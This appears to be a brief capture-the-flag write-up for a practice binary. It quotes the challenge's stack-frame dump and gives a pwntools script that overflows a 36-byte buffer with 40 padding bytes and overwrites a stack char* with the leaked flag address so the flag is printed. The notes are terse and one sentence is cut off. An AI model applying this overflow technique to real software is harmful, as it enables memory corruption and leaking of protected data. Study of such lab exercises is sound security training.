```
In this level, the flag will be loaded into the bss section of memory.
However, at no point will this program actually print the buffer storing the flag.
Reading flag into memory...
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffcf5a09ab0 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcf5a09ab8 (rsp+0x0008) | 78 ac a0 f5 fc 7f 00 00 | 0x00007ffcf5a0ac78 |
| 0x00007ffcf5a09ac0 (rsp+0x0010) | 68 ac a0 f5 fc 7f 00 00 | 0x00007ffcf5a0ac68 |
| 0x00007ffcf5a09ac8 (rsp+0x0018) | 25 05 ec 26 01 00 00 00 | 0x0000000126ec0525 |
| 0x00007ffcf5a09ad0 (rsp+0x0020) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |
| 0x00007ffcf5a09ad8 (rsp+0x0028) | a0 b6 01 27 46 75 00 00 | 0x000075462701b6a0 |
| 0x00007ffcf5a09ae0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcf5a09ae8 (rsp+0x0038) | 60 40 aa 83 f4 59 00 00 | 0x000059f483aa4060 |
| 0x00007ffcf5a09af0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcf5a09af8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcf5a09b00 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcf5a09b08 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcf5a09b10 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcf5a09b18 (rsp+0x0068) | 88 41 aa 83 f4 59 00 00 | 0x000059f483aa4188 |
| 0x00007ffcf5a09b20 (rsp+0x0070) | a0 11 aa 83 f4 59 00 00 | 0x000059f483aa11a0 |
| 0x00007ffcf5a09b28 (rsp+0x0078) | 00 e6 a1 c5 15 9c 0f 5d | 0x5d0f9c15c5a1e600 |
| 0x00007ffcf5a09b30 (rsp+0x0080) | 70 ab a0 f5 fc 7f 00 00 | 0x00007ffcf5a0ab70 |
| 0x00007ffcf5a09b38 (rsp+0x0088) | ff 1a aa 83 f4 59 00 00 | 0x000059f483aa1aff |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffcf5a09ab0, and our base pointer points to 0x7ffcf5a09b30.
This means that we have (decimal) 18 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 144 bytes.
The input buffer begins at 0x7ffcf5a09af0, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 36 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

This challenge has a char* on the stack that will be printed after parsing your input.
The char* is located at 0x7ffcf5a09b18, 40 bytes after the start of your input buffer.
The flag  is located at 0x59f483aa4060.

Pay close attention to how these values relate now, because they will change every time you run the program due to ASLR!
```
the program give us the location of the flag, and the location of the print address
just replace the char* at the a
```
#!/usr/bin/python3 
from pwn import * 
import re 

context.log_level='debug' 

p=process("/challenge/pointer-problems-easy") 

p.sendline(b"100") 
out=p.recvuntil(b"Payload size: Send your payload").decode() 
z=re.search('The flag is located at (0x[0-9a-f]+)', out) 
payload=b"A"*40 
if(z): 
	payload+=p64(int(z.group(1),16)) 
	p.sendline(payload) 
p.interactive()
```